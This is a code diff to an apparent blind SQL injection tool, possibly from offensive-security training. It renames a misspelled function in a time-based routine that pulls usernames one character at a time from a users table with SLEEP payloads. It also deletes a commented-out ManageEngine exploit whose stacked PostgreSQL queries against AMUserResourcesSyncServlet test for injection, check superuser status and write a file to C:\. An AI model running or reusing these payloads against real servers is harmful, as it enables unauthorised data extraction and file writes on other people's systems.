@@ -295,7 +295,7 @@ def extractUsernames(url, base_injection, max_time, proxy=None):
             found_char = False
             for char_code in range(32, 126):  # ASCII printable characters
                 payload = f"{base_injection} AND IF(ASCII(SUBSTRING((SELECT username FROM users LIMIT {index},1),{char_index},1))={char_code},SLEEP({max_time}),0)-- -"
-                if checkRequesTime(url, payload, max_time, proxy):
+                if checkRequestTime(url, payload, max_time, proxy):
                     username += chr(char_code)
                     char_index += 1
                     found_char = True
@@ -312,57 +312,3 @@ def extractUsernames(url, base_injection, max_time, proxy=None):
         index += 1
 
     return usernames
-
-# # Manged Engine Specific Exploits
-
-# def constructBlindSQLi(full_url, sqli):
-#     """
-#     Constructs the full URL with parameters for a SQL injection payload.
-
-#     Args:
-#         url (str): The target URL.
-#         sqli (str): The SQL injection payload.
-
-#     Returns:
-#         str: The full URL with the SQL injection payload.
-#     """
-    
-#     # Construct the full URL with the SQL injection payload
-#     params = f'ForMasRange=1&userId=1{sqli}'
-#     return f"{full_url}?{params}"
-
-	
-# def blindSQLi(url):
-# 	sqli = ";select+pg_sleep(10);"
-# 	sqli_pg_user = ";SELECT+case+when+(SELECT+current_setting($$is_superuser$$))=$$on$$+then+pg_sleep(10)+end;--+"
-# 	sqli_file_make=";COPY+(SELECT+$$offsec$$)+to+$$c:\\offsec.txt$$;--+"
-# 	print("\nRequest will return in 10 seconds if we have SQLi")
-# 	r = requests.get('https://%s:8443/servlet/AMUserResourcesSyncServlet' % url, 
-# 					  params='ForMasRange=1&userId=1%s' % sqli, verify=False)
-# 	print(r.text)
-# 	print(r.headers)
-	
-# 	print("\nRequest will return in 10 seconds if we are a superuser\n")
-# 	r = requests.get('https://%s:8443/servlet/AMUserResourcesSyncServlet' % url, 
-# 					  params='ForMasRange=1&userId=1%s' % sqli_pg_user, verify=False)
-# 	print(r.text)
-# 	print(r.headers)
-
-# 	print("\nCreating file in C:\\")
-# 	r = requests.get('https://%s:8443/servlet/AMUserResourcesSyncServlet' % url, 
-# 					  params='ForMasRange=1&userId=1%s' % sqli_file_make, verify=False)
-# 	print(r.text)
-# 	print(r.headers)
-
-
-# def main():
-# 	if len(sys.argv) != 2:
-# 		print(f"(+) usage %s <target>" % sys.argv[0])
-# 		print(f"(+) eg: %s target" % sys.argv[0])
-# 		sys.exit(1)
-	
-# 	if(checkRequesTime(url, 10)):
-#             print("Good")
-	
-# if __name__ == '__main__':
-# 	main()
